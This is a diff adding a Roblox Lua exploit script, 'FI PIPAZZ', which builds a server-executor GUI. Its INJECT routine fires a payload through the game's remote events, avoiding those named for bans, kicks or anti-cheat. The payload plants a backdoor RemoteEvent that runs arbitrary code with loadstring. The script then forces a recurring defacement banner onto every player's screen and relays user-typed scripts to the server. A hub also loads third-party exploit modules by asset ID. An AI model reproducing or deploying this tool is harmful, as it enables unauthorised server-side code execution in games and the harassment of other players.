@@ -1,0 +1,578 @@
+local P=game:GetService("Players")
+local LP=P.LocalPlayer 
+local UIS=game:GetService("UserInputService")
+local SG=game:GetService("StarterGui")
+local RS=game:GetService("ReplicatedStorage")
+local JS=game:GetService("JointsService")
+local TS=game:GetService("TweenService")
+local TxtS=game:GetService("TextService")
+
+local pn=LP.Name 
+local L={}
+
+L.Screen=Instance.new("ScreenGui")
+L.Screen.Parent=LP:WaitForChild("PlayerGui")
+L.Screen.ZIndexBehavior=Enum.ZIndexBehavior.Sibling 
+L.Screen.Name="FI_PIPAZZ_Main"
+L.Screen.ResetOnSpawn=false 
+
+L.Main=Instance.new("Frame")
+L.Main.Parent=L.Screen 
+L.Main.BorderSizePixel=0 
+L.Main.BackgroundColor3=Color3.fromRGB(0,0,0)
+L.Main.Size=UDim2.new(0,474,0,280)
+L.Main.AnchorPoint=Vector2.new(0.5,0)
+L.Main.Position=UDim2.new(0.5,0,0,0)
+L.Main.Visible=true 
+
+L.F4=Instance.new("Frame")
+L.F4.Parent=L.Main 
+L.F4.BorderSizePixel=0 
+L.F4.BackgroundColor3=Color3.fromRGB(145,145,145)
+L.F4.Size=UDim2.new(0,136,0,82)
+L.F4.Position=UDim2.new(0,314,0,24)
+Instance.new("UICorner",L.F4)
+L.US5=Instance.new("UIStroke",L.F4)
+L.US5.Color=Color3.fromRGB(255,0,0)
+
+L.F5=Instance.new("Frame")
+L.F5.Parent=L.Main 
+L.F5.BorderSizePixel=0 
+L.F5.BackgroundColor3=Color3.fromRGB(255,255,255)
+L.F5.Size=UDim2.new(0,136,0,106)
+L.F5.Position=UDim2.new(0,314,0,122)
+Instance.new("UICorner",L.F5)
+L.US8=Instance.new("UIStroke",L.F5)
+L.US8.Color=Color3.fromRGB(255,0,0)
+
+L.EX=Instance.new("TextButton")
+L.EX.Parent=L.Main 
+L.EX.TextWrapped=true 
+L.EX.BorderSizePixel=0 
+L.EX.TextScaled=true 
+L.EX.BackgroundColor3=Color3.fromRGB(121,121,121)
+L.EX.Size=UDim2.new(0,136,0,82)
+L.EX.Text="EXECUTE"
+L.EX.Position=UDim2.new(0,314,0,24)
+Instance.new("UICorner",L.EX)
+L.USB=Instance.new("UIStroke",L.EX)
+L.USB.Color=Color3.fromRGB(255,0,0)
+
+L.CL=Instance.new("TextButton")
+L.CL.Parent=L.Main 
+L.CL.TextWrapped=true 
+L.CL.BorderSizePixel=0 
+L.CL.TextScaled=true 
+L.CL.BackgroundColor3=Color3.fromRGB(102,102,102)
+L.CL.Size=UDim2.new(0,136,0,106)
+L.CL.Text="CLEAR"
+L.CL.Position=UDim2.new(0,314,0,122)
+Instance.new("UICorner",L.CL)
+L.USE=Instance.new("UIStroke",L.CL)
+L.USE.Color=Color3.fromRGB(255,0,0)
+
+L.HD=Instance.new("TextButton")
+L.HD.Parent=L.Main 
+L.HD.BorderSizePixel=0 
+L.HD.BackgroundColor3=Color3.fromRGB(113,113,113)
+L.HD.Size=UDim2.new(0,94,0,16)
+L.HD.Text="HIDE"
+L.HD.Position=UDim2.new(0,226,0,4)
+Instance.new("UICorner",L.HD)
+L.US11=Instance.new("UIStroke",L.HD)
+L.US11.Color=Color3.fromRGB(255,0,0)
+
+L.US12=Instance.new("UIStroke",L.Main)
+L.US12.Color=Color3.fromRGB(255,0,0)
+
+L.INJ=Instance.new("TextButton")
+L.INJ.Parent=L.Main 
+L.INJ.TextWrapped=true 
+L.INJ.BorderSizePixel=0 
+L.INJ.TextScaled=true 
+L.INJ.BackgroundColor3=Color3.fromRGB(111,111,111)
+L.INJ.Size=UDim2.new(0,166,0,36)
+L.INJ.Text="INJECT"
+L.INJ.Position=UDim2.new(0,300,0,238)
+Instance.new("UICorner",L.INJ)
+L.US15=Instance.new("UIStroke",L.INJ)
+L.US15.Color=Color3.fromRGB(255,0,0)
+
+Instance.new("UICorner",L.Main)
+
+L.F3=Instance.new("Frame")
+L.F3.Parent=L.Main 
+L.F3.BorderSizePixel=0 
+L.F3.BackgroundColor3=Color3.fromRGB(255,255,255)
+L.F3.Size=UDim2.new(0,94,0,16)
+L.F3.Position=UDim2.new(0,226,0,4)
+Instance.new("UICorner",L.F3)
+L.US19=Instance.new("UIStroke",L.F3)
+L.US19.Color=Color3.fromRGB(255,0,0)
+
+L.F6=Instance.new("Frame")
+L.F6.Parent=L.Main 
+L.F6.BorderSizePixel=0 
+L.F6.BackgroundColor3=Color3.fromRGB(255,255,255)
+L.F6.Size=UDim2.new(0,166,0,36)
+L.F6.Position=UDim2.new(0,300,0,238)
+Instance.new("UICorner",L.F6)
+L.US1c=Instance.new("UIStroke",L.F6)
+L.US1c.Color=Color3.fromRGB(255,0,0)
+
+L.TL=Instance.new("TextLabel")
+L.TL.Parent=L.Main 
+L.TL.BorderSizePixel=0 
+L.TL.BackgroundColor3=Color3.fromRGB(94,94,94)
+L.TL.Size=UDim2.new(0,148,0,16)
+L.TL.Text="FI PIPAZZ"
+L.TL.Position=UDim2.new(0,20,0,4)
+Instance.new("UICorner",L.TL)
+L.US20=Instance.new("UIStroke",L.TL)
+L.US20.Color=Color3.fromRGB(255,0,0)
+
+L.F2=Instance.new("Frame")
+L.F2.Parent=L.Main 
+L.F2.BorderSizePixel=0 
+L.F2.BackgroundColor3=Color3.fromRGB(87,87,87)
+L.F2.Size=UDim2.new(0,152,0,16)
+L.F2.Position=UDim2.new(0,18,0,4)
+Instance.new("UICorner",L.F2)
+L.US29=Instance.new("UIStroke",L.F2)
+L.US29.Color=Color3.fromRGB(255,0,0)
+
+local TF=TweenInfo.new(0.22,Enum.EasingStyle.Sine,Enum.EasingDirection.Out)
+local TM=TweenInfo.new(0.28,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
+local function twn(o,i,p) TS:Create(o,i,p):Play() end
+
+L.F24=Instance.new("Frame")
+L.F24.Parent=L.Main 
+L.F24.BorderSizePixel=0 
+L.F24.BackgroundColor3=Color3.fromRGB(75,75,75)
+L.F24.Size=UDim2.new(0,274,0,246)
+L.F24.Position=UDim2.new(0,18,0,26)
+Instance.new("UICorner",L.F24)
+L.US26=Instance.new("UIStroke",L.F24)
+L.US26.Color=Color3.fromRGB(255,0,0)
+L.F24.ZIndex=1 
+
+local SF=Instance.new("ScrollingFrame")
+SF.Parent=L.F24 
+SF.Size=UDim2.new(1,0,1,0)
+SF.BackgroundTransparency=1 
+SF.BorderSizePixel=0 
+SF.CanvasSize=UDim2.new(0,0,0,0)
+SF.ScrollBarThickness=4 
+SF.ScrollBarImageColor3=Color3.fromRGB(100,100,100)
+SF.ScrollingDirection=Enum.ScrollingDirection.Y 
+SF.ZIndex=2 
+
+L.TB=Instance.new("TextBox")
+L.TB.Parent=SF 
+L.TB.BorderSizePixel=0 
+L.TB.BackgroundColor3=Color3.fromRGB(95,95,95)
+L.TB.ClearTextOnFocus=false 
+L.TB.Size=UDim2.new(1,-16,1,-16)
+L.TB.Position=UDim2.new(0,8,0,8)
+L.TB.TextColor3=Color3.fromRGB(235,235,245)
+L.TB.Font=Enum.Font.Code 
+L.TB.TextSize=15 
+L.TB.MultiLine=true 
+L.TB.TextWrapped=true 
+L.TB.TextXAlignment=Enum.TextXAlignment.Left 
+L.TB.TextYAlignment=Enum.TextYAlignment.Top 
+
+L.TB.Text = "---Enter script here...\n---make by oRitOkidd!"
+L.TB.PlaceholderText = "---Enter script here...\n---make by oRitOkidd!"
+
+L.TB.PlaceholderColor3=Color3.fromRGB(160,160,180)
+L.TB.ZIndex=10 
+Instance.new("UICorner",L.TB)
+
+local BS=Instance.new("UIStroke") 
+BS.Thickness=1.2 
+BS.Color=Color3.fromRGB(255,0,0)
+BS.Transparency=0.7 
+BS.Enabled=false 
+BS.Parent=L.TB 
+
+local pc=false 
+
+local function ucs()
+    local c = L.TB.Text ~= "" and L.TB.Text or L.TB.PlaceholderText
+    local ts = TxtS:GetTextSize(c, L.TB.TextSize, L.TB.Font, Vector2.new(SF.AbsoluteSize.X-36,math.huge))
+    local h = math.max(ts.Y+40, SF.AbsoluteSize.Y-16)
+    L.TB.Size = UDim2.new(1,-16,0,h)
+    SF.CanvasSize = UDim2.new(0,0,0,h+16)
+end
+
+L.TB.Focused:Connect(function()
+    if not pc and L.TB.Text=="" then L.TB.Text="" pc=true end
+    BS.Enabled=true 
+    twn(BS,TF,{Transparency=0.35})
+end)
+
+L.TB.FocusLost:Connect(function()
+    if L.TB.Text=="" then 
+        pc=false 
+        twn(BS,TM,{Transparency=0.7}) 
+    else 
+        twn(BS,TF,{Transparency=0.4}) 
+    end
+    BS.Enabled = L.TB.Text~=""
+end)
+
+L.TB:GetPropertyChangedSignal("Text"):Connect(ucs)
+ucs()
+
+L.TL.ZIndex=10 
+L.HD.ZIndex=9 
+L.EX.ZIndex=9 
+L.CL.ZIndex=9 
+L.INJ.ZIndex=9 
+L.F24.ZIndex=1 
+L.Main.ZIndex=0 
+L.F2.ZIndex=2 
+L.F3.ZIndex=3 
+L.F4.ZIndex=4 
+L.F5.ZIndex=4 
+L.F6.ZIndex=4 
+
+local dr=false local di local ds local sp 
+local function u(i)
+    local d=i.Position-ds 
+    L.Main.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
+end
+
+L.Main.InputBegan:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then 
+        dr=true ds=i.Position sp=L.Main.Position 
+        i.Changed:Connect(function()
+            if i.UserInputState==Enum.UserInputState.End then dr=false end
+        end)
+    end
+end)
+
+UIS.InputChanged:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then 
+        di=i 
+    end
+end)
+
+UIS.InputChanged:Connect(function(i)
+    if dr and i==di then u(i) end
+end)
+
+local ToggleFI_Frame = Instance.new("Frame")
+ToggleFI_Frame.Name = "ToggleFI_Frame"
+ToggleFI_Frame.BorderSizePixel = 0
+ToggleFI_Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ToggleFI_Frame.Size = UDim2.new(0, 110, 0, 94)
+ToggleFI_Frame.Position = UDim2.new(0, 24, 1, -20)
+ToggleFI_Frame.AnchorPoint = Vector2.new(0, 1)
+ToggleFI_Frame.Visible = false
+ToggleFI_Frame.Parent = L.Screen
+
+Instance.new("UICorner", ToggleFI_Frame)
+
+local UIStroke_Frame = Instance.new("UIStroke", ToggleFI_Frame)
+UIStroke_Frame.Color = Color3.fromRGB(255, 0, 0)
+UIStroke_Frame.Thickness = 2.5
+
+local ToggleFI_Button = Instance.new("TextButton")
+ToggleFI_Button.Name = "ToggleFI"
+ToggleFI_Button.TextWrapped = true
+ToggleFI_Button.BorderSizePixel = 0
+ToggleFI_Button.TextScaled = true
+ToggleFI_Button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ToggleFI_Button.Size = UDim2.new(1, 0, 1, 0)
+ToggleFI_Button.Text = "FI"
+ToggleFI_Button.Font = Enum.Font.GothamBlack
+ToggleFI_Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleFI_Button.Parent = ToggleFI_Frame
+
+Instance.new("UICorner", ToggleFI_Button)
+
+local UIStroke_Button = Instance.new("UIStroke", ToggleFI_Button)
+UIStroke_Button.Color = Color3.fromRGB(255, 0, 0)
+UIStroke_Button.Thickness = 2.5
+
+local rotateTween = TS:Create(ToggleFI_Button, TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, false, 0), {Rotation = 360})
+rotateTween:Play()
+
+ToggleFI_Button.MouseButton1Click:Connect(function()
+    L.Main.Visible = true
+end)
+
+L.HD.MouseButton1Click:Connect(function()
+    L.Main.Visible = false
+end)
+
+local HBF=Instance.new("Frame")
+HBF.Name="HubBtnFrame"
+HBF.Parent=L.Main 
+HBF.BackgroundColor3=Color3.fromRGB(113,113,113)
+HBF.BorderSizePixel=0 
+HBF.Size=UDim2.new(0,94,0,16)
+HBF.Position=UDim2.new(0,326,0,4)
+Instance.new("UICorner",HBF)
+local HS=Instance.new("UIStroke")
+HS.Parent=HBF 
+HS.Color=Color3.fromRGB(255,0,0)
+HS.Thickness=1 
+
+local HTB=Instance.new("TextButton")
+HTB.Name="HubBtn"
+HTB.Parent=HBF 
+HTB.BackgroundTransparency=1 
+HTB.Size=UDim2.new(1,0,1,0)
+HTB.Text="Hub"
+HTB.TextColor3=Color3.fromRGB(0,0,0)
+HTB.Font=Enum.Font.SourceSansBold 
+HTB.TextSize=14 
+HTB.TextScaled=true 
+HTB.ZIndex=2 
+
+local HTS=Instance.new("UIStroke")
+HTS.Parent=HTB 
+HTS.Color=Color3.fromRGB(255,0,0)
+HTS.Thickness=1.2 
+
+local HF=Instance.new("Frame")
+HF.Name="HubFrame"
+HF.Parent=L.Screen 
+HF.BackgroundColor3=Color3.fromRGB(30,30,30)
+HF.BorderSizePixel=0 
+HF.Size=UDim2.new(0,340,0,210)
+HF.Position=UDim2.new(0.5,-170,0.5,-105)
+HF.AnchorPoint=Vector2.new(0.5,0.5)
+HF.Visible=false 
+HF.ZIndex=15 
+Instance.new("UICorner",HF).CornerRadius=UDim.new(0,8)
+local HTS2=Instance.new("UIStroke")
+HTS2.Parent=HF 
+HTS2.Color=Color3.fromRGB(255,0,0)
+HTS2.Thickness=1.4 
+
+local HT=Instance.new("Frame")
+HT.Parent=HF 
+HT.BackgroundColor3=Color3.fromRGB(45,45,45)
+HT.Size=UDim2.new(1,0,0,32)
+HT.BorderSizePixel=0 
+Instance.new("UICorner",HT).CornerRadius=UDim.new(0,8)
+
+local HTL=Instance.new("TextLabel")
+HTL.Parent=HT 
+HTL.BackgroundTransparency=1 
+HTL.Size=UDim2.new(1,-40,1,0)
+HTL.Position=UDim2.new(0,8,0,0)
+HTL.Text="Hub - Require Scripts"
+HTL.TextColor3=Color3.fromRGB(255,80,80)
+HTL.Font=Enum.Font.GothamBold 
+HTL.TextSize=16 
+HTL.TextXAlignment=Enum.TextXAlignment.Left 
+
+local CH=Instance.new("TextButton")
+CH.Parent=HT 
+CH.BackgroundColor3=Color3.fromRGB(180,40,40)
+CH.Size=UDim2.new(0,24,0,24)
+CH.Position=UDim2.new(1,-32,0.5,-12)
+CH.AnchorPoint=Vector2.new(0.5,0.5)
+CH.Text="X"
+CH.TextColor3=Color3.fromRGB(255,255,255)
+CH.Font=Enum.Font.SourceSansBold 
+CH.TextSize=16 
+Instance.new("UICorner",CH).CornerRadius=UDim.new(0,6)
+
+local HSf=Instance.new("ScrollingFrame")
+HSf.Parent=HF 
+HSf.BackgroundTransparency=1 
+HSf.BorderSizePixel=0 
+HSf.Position=UDim2.new(0,10,0,40)
+HSf.Size=UDim2.new(1,-20,1,-50)
+HSf.CanvasSize=UDim2.new(0,0,0,0)
+HSf.ScrollBarThickness=5 
+HSf.ScrollBarImageColor3=Color3.fromRGB(100,100,100)
+HSf.ScrollingDirection=Enum.ScrollingDirection.Y 
+
+local UIL=Instance.new("UIListLayout")
+UIL.Parent=HSf 
+UIL.Padding=UDim.new(0,8)
+UIL.SortOrder=Enum.SortOrder.LayoutOrder 
+
+local function AHB(n,c)
+    local b=Instance.new("TextButton")
+    b.Parent=HSf 
+    b.BackgroundColor3=Color3.fromRGB(80,80,80)
+    b.Size=UDim2.new(1,0,0,35)
+    b.Text=n 
+    b.TextColor3=Color3.fromRGB(220,220,220)
+    b.Font=Enum.Font.SourceSansBold 
+    b.TextSize=14 
+    b.TextWrapped=true 
+    Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)
+    local s=Instance.new("UIStroke")
+    s.Parent=b 
+    s.Color=Color3.fromRGB(255,0,0)
+    s.Thickness=1.2 
+    b.MouseButton1Click:Connect(function()
+        local f=c:gsub('""','"'..pn..'"'):gsub("''","'"..pn.."'"):gsub('"name"','"'..pn..'"')
+        L.TB.Text=f 
+        ucs()
+        n("select script!","auto fill user!"..n)
+        HF.Visible=false 
+    end)
+end
+
+AHB("KoopGui V11",[[require(15267263357).V11("")]])
+AHB("R6",[[require(3436957371):r6("")]])
+AHB("SSP",[[require(96288911777671):SSP("")]])
+AHB("Rc7",[[require(12350030542).RC7("")]])
+AHB("polaria",[[require(110951620907921):Pload("")]])
+AHB("Sensation Hub",[[require(100263845596551)("")]])
+AHB("Pepsi gui",[[require(113825094179678).pepsi("")]])
+AHB("Catlol",[[require(77579329778474).catlol("")]])
+AHB("IDE",[[require(121425622240385).dominantultimate("")]])
+AHB("Bipolaria",[[require(88477009909590):Pload("")]])
+AHB("RoLoader",[[require(112796675826571).RoLoader("name")]])
+AHB("Dominant",[[require(135879132527047).dominant("name")]])
+AHB("FSA",
+[[require(72732733952061).FSA("")]])
+AHB("Stigma",[[require(132938459666886).stigma("name")]])
+AHB("Ro-xploit v7.0",[[require(96184029574075)("")]])
+
+local function UHC()
+    local t=0 
+    for _,c in ipairs(HSf:GetChildren()) do 
+        if c:IsA("GuiObject") then 
+            t=t+c.Size.Y.Offset+UIL.Padding.Offset 
+        end 
+    end 
+    HSf.CanvasSize=UDim2.new(0,0,0,t+20)
+end
+
+UIL:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(UHC)
+HF:GetPropertyChangedSignal("Visible"):Connect(UHC)
+
+HTB.MouseButton1Click:Connect(function()
+    HF.Visible=not HF.Visible 
+end)
+
+CH.MouseButton1Click:Connect(function()
+    HF.Visible=false 
+end)
+
+local dh,dih,dsh,sph 
+local function uh(i)
+    local d=i.Position-dsh 
+    HF.Position=UDim2.new(sph.X.Scale,sph.X.Offset+d.X,sph.Y.Scale,sph.Y.Offset+d.Y)
+end
+
+HT.InputBegan:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then 
+        dh=true dsh=i.Position sph=HF.Position 
+        i.Changed:Connect(function()
+            if i.UserInputState==Enum.UserInputState.End then dh=false end
+        end)
+    end
+end)
+
+UIS.InputChanged:Connect(function(i)
+    if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then 
+        dih=i 
+    end
+end)
+
+UIS.InputChanged:Connect(function(i)
+    if dh and i==dih then uh(i) end
+end)
+
+HTB.ZIndex=10 
+HBF.ZIndex=9 
+
+local function n(t,x)
+    SG:SetCore("SendNotification",{Title=t,Text=x,Duration=5})
+end
+
+local function fsr(r,c)
+    for _,v in ipairs(r:GetChildren()) do 
+        local nl=v.Name:lower()
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) 
+        and not nl:find("ban") and not nl:find("kick") 
+        and not nl:find("anticheat") and not nl:find("report") 
+        and not nl:find("filter") then 
+            c(v) 
+        end 
+    end 
+end
+
+local function ti(r)
+    if injected then return end 
+    local m=r:IsA("RemoteEvent") and "FireServer" or (r:IsA("RemoteFunction") and "InvokeServer")
+    if not m then return end 
+    pcall(function()
+        r[m](r,[[local JS=game:GetService("JointsService")local bn="_PIPAZZ_BYPASS"if not JS:FindFirstChild(bn)then local e=Instance.new("RemoteEvent")e.Name=bn e.Parent=JS e.OnServerEvent:Connect(function(p,cd)local f,e=loadstring(cd)if f then pcall(f)end end)end]])
+    end)
+end
+
+local injected = false
+local attachedRemote
+
+L.INJ.MouseButton1Click:Connect(function()
+    if injected then 
+        n("Already","Backdoor attached.") 
+        return 
+    end 
+    
+    task.spawn(function() fsr(RS,ti) end)
+    task.spawn(function() fsr(JS,ti) end)
+    task.spawn(function() fsr(game:GetService("ServerScriptService"),ti) end)
+    
+    local w=0 local bn="_PIPAZZ_BYPASS"
+    while w<8 do 
+        if JS:FindFirstChild(bn) then break end 
+        task.wait(0.025) w=w+0.025 
+    end 
+    
+    local br=JS:FindFirstChild(bn)
+    if br and br:IsA("RemoteEvent") then 
+        injected = true
+        attachedRemote = br 
+        L.INJ.Text = "SUCCESS"
+        L.INJ.BackgroundColor3 = Color3.fromRGB(50,120,60)
+        
+        ToggleFI_Frame.Visible = true
+        
+        pcall(function()
+            attachedRemote:FireServer([[local function cpg()for _,p in ipairs(game.Players:GetPlayers())do if p:FindFirstChild("PlayerGui")then local s=Instance.new("ScreenGui")s.Name="PIPAZZ_GUI"s.ResetOnSpawn=false s.IgnoreGuiInset=true s.Parent=p.PlayerGui local f=Instance.new("Frame")f.Size=UDim2.new(1,0,0.15,0)f.Position=UDim2.new(0,0,0,0)f.BackgroundColor3=Color3.fromRGB(0,0,0)f.BackgroundTransparency=0.4 f.BorderSizePixel=0 f.Parent=s local t=Instance.new("TextLabel")t.Size=UDim2.new(1,0,1,0)t.BackgroundTransparency=1 t.Text="OGM REEL FI PIPAZZ"t.TextColor3=Color3.fromRGB(255,0,0)t.TextScaled=true t.Font=Enum.Font.GothamBlack t.Parent=f task.spawn(function()while true do task.wait(1)if not s.Parent then cpg()break end end end)end end end cpg()while true do task.wait(5)cpg()end]])
+        end)
+        n("Inject Success","Backdoor & GUI activated.")
+    else 
+        n("Inject Failed","No backdoor.")
+        L.INJ.Text="no backdoor!"
+        L.INJ.BackgroundColor3=Color3.fromRGB(140,50,50)
+    end 
+end)
+
+L.EX.MouseButton1Click:Connect(function()
+    if not injected or not attachedRemote then n("Error","Inject first.") return end 
+    local c=L.TB.Text 
+    if c=="" or c:match("^%s*$") then n("Error","No script.") return end 
+    
+    local p={'"yourusername"','"username"','"playername"','"plrname"','"name"','"user"','"nick"','"nickname"','"usernamehere"','"yourname"','"player"','"plr"','"myname"','"account"','"accname"','"robloxname"','"rbxname"','"id"','"user_id"','"userid"','"your user"','"your player"','"your plr"','"your nick"','\'yourusername\'','\'username\'','\'playername\'','\'plrname\'','\'name\'','\'user\'','\'nick\'','\'nickname\'','\'usernamehere\'','\'yourname\'','\'player\'','\'plr\'','\'myname\'','\'account\'','\'accname\'','\'robloxname\'','\'rbxname\'','\'id\'','\'user_id\'','\'userid\'','\'your user\'','\'your player\'','\'your plr\'','\'your nick\''}
+    for _,pt in ipairs(p) do 
+        c=c:gsub("(?i)"..pt,'"'..pn..'"') 
+    end 
+    
+    local s,e=pcall(function() attachedRemote:FireServer(c) end)
+    if s then n("Executed","Done.") 
+    else n("Error",tostring(e):sub(1,200)) end
+end)
+
+L.CL.MouseButton1Click:Connect(function()
+    L.TB.Text="" 
+    n("Cleared","Input cleared.") 
+    ucs()
+end)
+
+L.Main.Visible=true
